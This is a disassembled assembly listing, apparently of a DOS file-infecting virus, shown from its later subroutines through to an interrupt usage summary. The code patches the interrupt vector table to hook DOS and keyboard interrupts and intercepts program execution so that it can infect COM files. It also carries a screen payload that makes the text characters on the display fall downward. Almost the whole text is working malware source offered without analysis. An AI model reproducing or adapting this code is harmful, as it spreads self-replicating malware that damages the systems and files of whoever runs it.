;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		xor	ax,ax			; Zero register
		mov	ds,ax
		lds	di,dword ptr ds:data_11e	; (0000:009C=10BCh) Load 32 bit ptr
		lds	di,dword ptr [di+1]	; Load 32 bit ptr
		mov	ax,di
		sub	di,75Fh
		call	sub_11			; (07AB)
		jz	loc_ret_47		; Jump if zero
		mov	di,ax
		sub	di,755h
		call	sub_11			; (07AB)
		jz	loc_ret_47		; Jump if zero
		lds	di,dword ptr ds:data_27e	; (00AE:0080=4EFFh) Load 32 bit ptr
		lds	di,dword ptr [di+1]	; Load 32 bit ptr
		mov	ax,di
		sub	di,676h
		call	sub_11			; (07AB)
		jz	loc_ret_47		; Jump if zero
		mov	di,ax
		sub	di,673h
		call	sub_11			; (07AB)

loc_ret_47:					;  xref 6FB8:0782, 078D, 079F
		retn
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:077F, 078A, 079C, 07A7
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		xor	dx,dx			; Zero register
		cmp	word ptr [di],4756h
		jne	loc_48			; Jump if not equal
		cmp	byte ptr [di+2],31h	; '1'
		je	loc_49			; Jump if equal
loc_48:						;  xref 6FB8:07B1
		inc	dx
loc_49:						;  xref 6FB8:07B7
		sub	di,0F7h
		or	dx,dx			; Zero ?
		retn
sub_11		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:07DE, 07E4, 07EA, 07F0, 0864, 086A, 0870
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		mov	al,0EAh
		stosb				; Store al to es:[di]
		mov	ax,cx
		add	ax,si
		stosw				; Store ax to es:[di]
		mov	ax,cs
		stosw				; Store ax to es:[di]

loc_ret_50:					;  xref 6FB8:07CF
		retn
sub_12		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:04F4
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_13		proc	near
		or	dx,dx			; Zero ?
		jz	loc_ret_50		; Jump if zero
		push	ds
		push	es
		mov	es,ds:data_39e[si]	; (6FB8:00E0=0)
		mov	di,data_46e		; (6FB8:00EC=0)
		cld				; Clear direction
		mov	cx,9A8h
		call	sub_12			; (07C1)
		mov	cx,76Ah
		call	sub_12			; (07C1)
		mov	cx,7BEh
		call	sub_12			; (07C1)
		mov	cx,84Ch
		call	sub_12			; (07C1)
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ax,0ECh
		xchg	ax,ds:data_3e		; (0000:0070=0FF53h)
		mov	word ptr cs:[0A88h][si],ax	; (6FB8:0A88=49A0h)
		mov	ax,es
		xchg	ax,ds:data_4e		; (0000:0072=0F000h)
		mov	word ptr cs:[0A8Ah][si],ax	; (6FB8:0A8A=0B904h)
		mov	ax,0F1h
		xchg	ax,ds:data_5e		; (0000:0080=1094h)
		mov	word ptr cs:[76Eh][si],ax	; (6FB8:076E=0C033h)
		mov	ax,es
		xchg	ax,ds:data_6e		; (0000:0082=123h)
		mov	word ptr cs:[770h][si],ax	; (6FB8:0770=0D88Eh)
		mov	ax,0F6h
		xchg	ax,ds:data_7e		; (0000:0084=109Eh)
		mov	word ptr cs:[7DCh][si],ax	; (6FB8:07DC=9A8h)
		mov	ax,es
		xchg	ax,ds:data_8e		; (0000:0086=123h)
		mov	word ptr cs:[7DEh][si],ax	; (6FB8:07DE=0E0E8h)
		mov	ax,0FBh
		xchg	ax,ds:data_11e		; (0000:009C=10BCh)
		mov	word ptr cs:[857h][si],ax	; (6FB8:0857=6C3h)
		mov	ax,es
		xchg	ax,word ptr ds:data_11e+2	; (0000:009E=123h)
		mov	word ptr cs:[859h][si],ax	; (6FB8:0859=848Eh)
		pop	es
		pop	ds
		sti				; Enable interrupts
		retn
sub_13		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:08F2
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		push	es
		mov	es,word ptr ds:[0E0h][si]	; (0000:00E0=10DAh)
		mov	di,data_21e		; (0000:00F1=10h)
		cld				; Clear direction
		mov	cx,76Dh
		call	sub_12			; (07C1)
		mov	cx,7E0h
		call	sub_12			; (07C1)
		mov	cx,856h
		call	sub_12			; (07C1)
		pop	es
		retn
sub_14		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:024A, 0938
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15		proc	near
		push	es
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	ax,85Bh
		add	ax,si
		xchg	ax,es:data_9e		; (0000:0090=156h)
		mov	ds:data_18e[si],ax	; (0000:00EA=123h)
		mov	ax,cs
		xchg	ax,es:data_10e		; (0000:0092=44Bh)
		mov	ds:data_19e[si],ax	; (0000:00EC=10DAh)
		pop	es
		mov	byte ptr ds:data_20e[si],0	; (0000:00EE=23h)
		retn
sub_15		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0499, 0981
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_16		proc	near
		push	es
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	ax,cs:data_45e[si]	; (6FB8:00EA=0)
		mov	es:data_9e,ax		; (0000:0090=156h)
		mov	ax,cs:data_46e[si]	; (6FB8:00EC=0)
		mov	es:data_10e,ax		; (0000:0092=44Bh)
		pop	es
		retn
sub_16		endp

		jmp	short loc_53		; (08EA)
		nop
;*		jmp	far ptr loc_2		;*(029B:136C)
		db	0EAh, 6Ch, 13h, 9Bh, 02h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0247, 08CB, 08EC, 0935
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_17		proc	near
		pop	bx
		push	ds
		push	ax
		push	ds
		push	cs
		pop	ds
		call	sub_18			; (08C4)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;         Called from:	 6FB8:08C1

sub_18:
		pop	si
		sub	si,77Bh
		jmp	bx			;*Register jump
loc_51:						;  xref 6FB8:0918, 091D
		call	sub_17			; (08BB)
		push	cx
		mov	ax,[si+7]
		mov	cx,es
		cmp	ax,cx
		pop	cx
		pop	ds
		pop	ax
		jnz	loc_52			; Jump if not zero
		push	cs
		pop	es
		cmp	ah,49h			; 'I'
		je	loc_52			; Jump if equal
		add	bx,1D0h
loc_52:						;  xref 6FB8:08D9, 08E0
		pop	ds
		jmp	short loc_55		; (0924)
		db	90h
loc_53:						;  xref 6FB8:08B3, 090A, 0913
		xor	dx,dx			; Zero register
loc_54:						;  xref 6FB8:090F
		call	sub_17			; (08BB)
		push	es
		push	dx
		cli				; Disable interrupts
		call	sub_14			; (0858)
		sti				; Enable interrupts
		pop	ax
		mov	dx,1D0h
		add	dx,ax
		add	dx,10h
		pop	es
		pop	ds
		pop	ax
		pop	ds
		mov	ah,31h			; '1'
		jmp	short loc_55		; (0924)
		cmp	ah,4Ch			; 'L'
		je	loc_53			; Jump if equal
		cmp	ah,31h			; '1'
		je	loc_54			; Jump if equal
		or	ah,ah			; Zero ?
		jz	loc_53			; Jump if zero
		cmp	ah,49h			; 'I'
		je	loc_51			; Jump if equal
		cmp	ah,4Ah			; 'J'
		je	loc_51			; Jump if equal
		cmp	ah,4Bh			; 'K'
		je	loc_56			; Jump if equal
loc_55:						;  xref 6FB8:08E7, 0905, 0993
;*		jmp	far ptr loc_4		;*(0E4C:035D)
		db	0EAh, 5Dh, 03h, 4Ch, 0Eh
		db	 80h,0FCh, 4Bh, 75h,0F6h
loc_56:						;  xref 6FB8:0922
		push	cx
		push	dx
		push	es
		push	bx
		push	si
		push	di
		push	bp
		call	sub_17			; (08BB)
		call	sub_15			; (0875)
loc_57:						;  xref 6FB8:0941, 0949
		sti				; Enable interrupts
		test	byte ptr ds:data_26e,2	; (0000:0972=74h)
		jnz	loc_57			; Jump if not zero
		cli				; Disable interrupts
		test	byte ptr ds:data_26e,2	; (0000:0972=74h)
		jnz	loc_57			; Jump if not zero
		or	byte ptr ds:data_26e,2	; (0000:0972=74h)
		pop	ds
		mov	bx,dx
		mov	byte ptr cs:data_40e[si],0FFh	; (6FB8:00E2=0)
		cmp	byte ptr [bx+1],3Ah	; ':'
		jne	loc_58			; Jump if not equal
		mov	al,[bx]
		or	al,20h			; ' '
		sub	al,61h			; 'a'
		mov	cs:data_40e[si],al	; (6FB8:00E2=0)
loc_58:						;  xref 6FB8:095D
		push	si
		push	di
		push	es
		cld				; Clear direction
		mov	si,dx
		push	cs
		pop	es
		mov	di,offset ds:[984h]	; (6FB8:0984=2Eh)
loc_59:						;  xref 6FB8:0979
		lodsb				; String [si] to al
		stosb				; Store al to es:[di]
		or	al,al			; Zero ?
		jnz	loc_59			; Jump if not zero
		pop	es
		pop	di
		pop	si
		call	sub_5			; (056E)
		call	sub_16			; (089A)
		and	byte ptr cs:[972h],0FDh	; (6FB8:0972=0BFh)
		pop	ax
		pop	ds
		pop	bp
		pop	di
		pop	si
		pop	bx
		pop	es
		pop	dx
		pop	cx
		jmp	short loc_55		; (0924)
sub_17		endp

		db	 83h,0C2h, 0Fh,0B1h, 04h,0D3h
		db	0EAh,0E9h, 4Dh,0FFh,0EAh,0FEh
		db	 5Dh, 9Bh, 02h, 56h,0E8h, 00h
		db	 00h, 5Eh, 81h,0EEh, 5Fh, 08h
		db	 2Eh, 80h, 8Ch,0EEh, 00h, 01h
		db	 5Eh, 32h,0C0h,0CFh, 01h, 00h
		db	 00h, 00h, 8Ah, 00h, 00h, 00h
		db	 00h, 5Fh,0FEh, 00h, 00h, 00h
		db	 00h,0B8h, 00h, 00h, 49h, 00h
		db	 00h, 00h
		db	'A:\TEST3066.COM'


		db	 00h, 00h, 00h, 45h, 58h, 45h
		db	 00h, 45h, 00h
		db	143 dup (0)
loc_60:						;  xref 6FB8:0AEF
		push	cx
		push	ds
		push	es
		push	si
		push	di
		push	cs
		pop	es
		cld				; Clear direction
		test	al,20h			; ' '
		jz	loc_63			; Jump if zero
		test	al,2
		jnz	loc_64			; Jump if not zero
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	al,ds:data_25e		; (0000:0449=3)
		mov	cx,0B800h
		cmp	al,7
		jne	loc_61			; Jump if not equal
		mov	cx,0B000h
		jmp	short loc_62		; (0A9F)
loc_61:						;  xref 6FB8:0A90
		cmp	al,2
		je	loc_62			; Jump if equal
		cmp	al,3
		jne	loc_64			; Jump if not equal
loc_62:						;  xref 6FB8:0A95, 0A99
		mov	word ptr cs:[97Ch],cx	; (6FB8:097C=5E5Fh)
		or	byte ptr cs:[972h],2	; (6FB8:0972=0BFh)
		mov	word ptr cs:[97Eh],0	; (6FB8:097E=0EDE8h)
		mov	ds,cx
		mov	cx,7D0h
		xor	si,si			; Zero register
		mov	di,offset ds:[0CF5h]	; (6FB8:0CF5=0BEh)
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	ax,0B92h
		xchg	ax,ds:data_1e		; (0000:0024=45h)
		mov	word ptr cs:[973h],ax	; (6FB8:0973=984h)
		mov	ax,cs
		xchg	ax,ds:data_2e		; (0000:0026=3D1h)
		mov	word ptr cs:[975h],ax	; (6FB8:0975=0AAACh)
loc_63:						;  xref 6FB8:0A7E
		mov	cx,50h
		mov	ax,0F00h
		mov	di,offset data_54	; (6FB8:0105=9)
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
		and	byte ptr cs:[972h],7	; (6FB8:0972=0BFh)
loc_64:						;  xref 6FB8:0A82, 0A9D
		pop	di
		pop	si
		pop	es
		pop	ds
		pop	cx
		jmp	loc_76			; (0BCF)
loc_65:						;  xref 6FB8:0AFE
		jmp	short loc_60		; (0A74)
		push	ax
		mov	byte ptr cs:[979h],0	; (6FB8:0979=75h)
		mov	al,byte ptr cs:[972h]	; (6FB8:0972=0BFh)
		test	al,60h			; '`'
		jnz	loc_65			; Jump if not zero
		test	al,80h
		jz	loc_68			; Jump if zero
		cmp	word ptr cs:[97Eh],0	; (6FB8:097E=0EDE8h)
		je	loc_66			; Jump if equal
		inc	word ptr cs:[97Eh]	; (6FB8:097E=0EDE8h)
		cmp	word ptr cs:[97Eh],444h	; (6FB8:097E=0EDE8h)
		jl	loc_66			; Jump if <
		call	sub_19			; (0C25)
		jmp	loc_76			; (0BCF)
loc_66:						;  xref 6FB8:0B0A, 0B18
		test	al,18h
		jz	loc_67			; Jump if zero
		dec	word ptr cs:[977h]	; (6FB8:0977=0C00Ah)
		jnz	loc_67			; Jump if not zero
		and	byte ptr cs:[972h],0E7h	; (6FB8:0972=0BFh)
		or	byte ptr cs:[972h],40h	; (6FB8:0972=0BFh) '@'
		test	al,8
		jz	loc_67			; Jump if zero
		or	byte ptr cs:[972h],20h	; (6FB8:0972=0BFh) ' '
loc_67:						;  xref 6FB8:0B22, 0B29, 0B39, 0B4C
		jmp	loc_76			; (0BCF)
loc_68:						;  xref 6FB8:0B02
		xor	byte ptr cs:[972h],1	; (6FB8:0972=0BFh)
		test	al,1
		jz	loc_67			; Jump if zero
		push	bx
		push	si
		push	ds
		mov	ds,word ptr cs:[97Ch]	; (6FB8:097C=5E5Fh)
		xor	si,si			; Zero register
		mov	byte ptr cs:[96Eh],0	; (6FB8:096E=8Bh)
loc_69:						;  xref 6FB8:0BB5
		mov	bx,cs:data_54[si]	; (6FB8:0105=0CD09h)
		or	bx,bx			; Zero ?
		jz	loc_70			; Jump if zero
		cmp	byte ptr [bx+si],20h	; ' '
		jne	loc_70			; Jump if not equal
		cmp	byte ptr ds:data_31e[bx+si],20h	; (5E5F:FF60=0FFh) ' '
		je	loc_70			; Jump if equal
		mov	ax,720h
		xchg	ax,ds:data_31e[bx+si]	; (5E5F:FF60=0FFFFh)
		mov	[bx+si],ax
		add	bx,0A0h
loc_70:						;  xref 6FB8:0B65, 0B6A, 0B71
		cmp	bx,data_30e		; (5E5F:0FA0=0FFh)
		je	loc_71			; Jump if equal
		cmp	byte ptr [bx+si],20h	; ' '
		jne	loc_71			; Jump if not equal
		jnz	loc_74			; Jump if not zero
loc_71:						;  xref 6FB8:0B84, 0B89
		mov	bx,data_29e		; (5E5F:0F00=0FFh)
loc_72:						;  xref 6FB8:0BA2
		cmp	byte ptr [bx+si],20h	; ' '
		jne	loc_73			; Jump if not equal
		cmp	byte ptr ds:data_31e[bx+si],20h	; (5E5F:FF60=0FFh) ' '
		jne	loc_74			; Jump if not equal
loc_73:						;  xref 6FB8:0B93
		sub	bx,0A0h
		or	bx,bx			; Zero ?
		jnz	loc_72			; Jump if not zero
loc_74:						;  xref 6FB8:0B8B, 0B9A
		mov	cs:data_54[si],bx	; (6FB8:0105=0CD09h)
		or	word ptr cs:[96Eh],bx	; (6FB8:096E=0F28Bh)
		add	si,2
		cmp	si,0A0h
		jne	loc_69			; Jump if not equal
		cmp	byte ptr cs:[96Eh],0	; (6FB8:096E=8Bh)
		jne	loc_75			; Jump if not equal
		or	byte ptr cs:[972h],80h	; (6FB8:0972=0BFh)
		mov	word ptr cs:[97Eh],1	; (6FB8:097E=0EDE8h)
loc_75:						;  xref 6FB8:0BBD
		pop	ds
		pop	si
		pop	bx
loc_76:						;  xref 6FB8:0AEC, 0B1D, 0B41
		pop	ax
;*		jmp	far ptr loc_90		;*(FC00:3F4D)
		db	0EAh, 4Dh, 3Fh, 00h,0FCh
loc_77:						;  xref 6FB8:0C32
		mov	al,20h			; ' '
		out	20h,al			; port 20h, 8259-1 int command
						;  al = 20h, end of interrupt
		pop	ax
		iret				; Interrupt return
		db	 50h,0E4h, 60h, 2Eh,0A2h, 7Ah
		db	 09h,0E4h, 61h, 8Ah,0E0h, 0Ch
		db	 80h,0E6h, 61h, 8Ah,0C4h,0E6h
		db	 61h, 2Eh, 80h, 3Eh, 79h, 09h
		db	 00h, 2Eh,0C6h, 06h, 79h, 09h
		db	 01h, 75h,0D9h, 2Eh,0A0h, 7Ah
		db	 09h, 3Ch,0F0h, 74h,0D1h, 24h
		db	 7Fh, 2Eh, 3Ah, 06h, 7Bh, 09h
		db	 2Eh,0A2h, 7Bh, 09h, 74h,0C4h
		db	 2Eh, 83h, 3Eh, 7Eh, 09h, 00h
		db	 74h, 07h, 2Eh,0C7h, 06h, 7Eh
		db	 09h, 01h, 00h,0E8h, 02h, 00h
		db	0EBh,0B0h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0B1A
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_19		proc	near
		mov	word ptr cs:[977h],28h	; (6FB8:0977=0C00Ah)
		test	byte ptr cs:[972h],80h	; (6FB8:0972=0BFh)
		jz	loc_77			; Jump if zero
		mov	byte ptr cs:[970h],1	; (6FB8:0970=0Eh)
		push	bx
		push	si
		push	ds
		mov	ds,word ptr cs:[97Ch]	; (6FB8:097C=5E5Fh)
		test	byte ptr cs:[972h],10h	; (6FB8:0972=0BFh)
		jnz	loc_81			; Jump if not zero
		or	byte ptr cs:[972h],10h	; (6FB8:0972=0BFh)
		xor	si,si			; Zero register
loc_78:						;  xref 6FB8:0C77
		mov	bx,data_29e		; (5E5F:0F00=0FFh)
loc_79:						;  xref 6FB8:0C5E
		cmp	byte ptr [bx+si],20h	; ' '
		je	loc_80			; Jump if equal
		sub	bx,0A0h
		jnc	loc_79			; Jump if carry=0
		mov	bx,0F00h
loc_80:						;  xref 6FB8:0C58
		add	bx,data_28e		; (5E5F:00A0=0FFh)
		mov	cs:data_54[si],bx	; (6FB8:0105=0CD09h)
		mov	word ptr cs:[980h][si],bx	; (6FB8:0980=0E8FBh)
		inc	si
		inc	si
		cmp	si,data_37e		; (6FB8:00A0=0)
		jne	loc_78			; Jump if not equal
loc_81:						;  xref 6FB8:0C48
		xor	si,si			; Zero register
loc_82:						;  xref 6FB8:0CE4
		cmp	cs:data_54[si],0FA0h	; (6FB8:0105=0CD09h)
		je	loc_88			; Jump if equal
		mov	bx,word ptr cs:[980h][si]	; (6FB8:0980=0E8FBh)
		mov	ax,[bx+si]
		cmp	ax,word ptr cs:[0CF5h][bx+si]	; (6FB8:0CF5=0F5BEh)
		jne	loc_84			; Jump if not equal
		push	bx
loc_83:						;  xref 6FB8:0CA0, 0CA4
		or	bx,bx			; Zero ?
		jz	loc_86			; Jump if zero
		sub	bx,0A0h
		cmp	ax,word ptr cs:[0CF5h][bx+si]	; (6FB8:0CF5=0F5BEh)
		jne	loc_83			; Jump if not equal
		cmp	ax,[bx+si]
		je	loc_83			; Jump if equal
		pop	bx
loc_84:						;  xref 6FB8:0C90
		or	bx,bx			; Zero ?
		jnz	loc_85			; Jump if not zero
		mov	word ptr [si],720h
		jmp	short loc_87		; (0CCB)
loc_85:						;  xref 6FB8:0CA9
		mov	ax,[bx+si]
		mov	ds:data_31e[bx+si],ax	; (5E5F:FF60=0FFFFh)
		mov	word ptr [bx+si],720h
		sub	word ptr cs:[980h][si],0A0h	; (6FB8:0980=0E8FBh)
		mov	byte ptr cs:[970h],0	; (6FB8:0970=0Eh)
		jmp	short loc_88		; (0CDE)
loc_86:						;  xref 6FB8:0C95
		pop	bx
loc_87:						;  xref 6FB8:0CAF
		mov	bx,cs:data_54[si]	; (6FB8:0105=0CD09h)
		add	bx,0A0h
		mov	cs:data_54[si],bx	; (6FB8:0105=0CD09h)
		mov	word ptr cs:[980h][si],bx	; (6FB8:0980=0E8FBh)
loc_88:						;  xref 6FB8:0C82, 0CC8
		inc	si
		inc	si
		cmp	si,0A0h
		jne	loc_82			; Jump if not equal
		cmp	byte ptr cs:[970h],0	; (6FB8:0970=0Eh)
		je	loc_89			; Jump if equal
		push	es
		push	di
		push	cx
		push	ds
		pop	es
		push	cs
		pop	ds
		mov	si,offset ds:[0CF5h]	; (6FB8:0CF5=0BEh)
		xor	di,di			; Zero register
		mov	cx,7D0h
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		mov	word ptr cs:[977h],0FFDCh	; (6FB8:0977=0C00Ah)
		and	byte ptr cs:[972h],4	; (6FB8:0972=0BFh)
		or	byte ptr cs:[972h],88h	; (6FB8:0972=0BFh)
		mov	word ptr cs:[97Eh],0	; (6FB8:097E=0EDE8h)
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	ax,word ptr cs:[973h]	; (6FB8:0973=984h)
		mov	ds:data_1e,ax		; (0000:0024=45h)
		mov	ax,word ptr cs:[975h]	; (6FB8:0975=0AAACh)
		mov	ds:data_2e,ax		; (0000:0026=3D1h)
		pop	cx
		pop	di
		pop	es
loc_89:						;  xref 6FB8:0CEC
		pop	ds
		pop	si
		pop	bx
		retn
sub_19		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:04D3, 04EC
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_20		proc	near
		cld				; Clear direction
		pop	ax
		sub	ax,si
		add	ax,di
		push	es
		push	ax
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retf				; Return far
sub_20		endp

		db	 90h, 50h,0E8h,0E2h, 03h, 8Bh

seg_a		ends



		end	start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type	   label
   ---- ----   ----   ---------------
   6FB8:0100   far    start

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :	 set default drive dl  (0=a:)
        Interrupt 21h :	 get default drive al  (0=a:)
        Interrupt 21h :	 set DTA to ds:dx
        Interrupt 21h :	 get date, cx=year, dx=mon/day
        Interrupt 21h :	 set current dir, path @ ds:dx
        Interrupt 21h :	 open file, al=mode,name@ds:dx
        Interrupt 21h :	 close file, bx=file handle
        Interrupt 21h :	 read file, cx=bytes, to ds:dx
        Interrupt 21h :	 write file cx=bytes, to ds:dx
        Interrupt 21h :	 move file ptr, cx,dx=offset
        Interrupt 21h :	 get/set file attrb, nam@ds:dx
        Interrupt 21h :	 get present dir,drive dl,1=a:
        Interrupt 21h :	 get/set file date & time

 ±±±±±±±±±±±±±±±±±± I/O	Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        Port 20h   : 8259-1 int command

